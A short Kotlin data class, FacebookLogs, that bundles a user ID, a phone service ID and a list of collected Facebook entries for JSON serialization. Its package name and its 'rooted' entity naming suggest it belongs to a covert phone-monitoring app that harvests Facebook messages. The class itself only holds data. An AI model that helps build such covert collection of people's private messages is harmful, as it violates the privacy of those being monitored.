package com.android.services.models.im

import com.android.services.db.entities.FacebookRooted
import com.google.gson.annotations.SerializedName

class FacebookLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("facebookLogs")
    var facebookList: List<FacebookRooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        facebookUnrootedList: List<FacebookRooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        facebookList = facebookUnrootedList
    }
}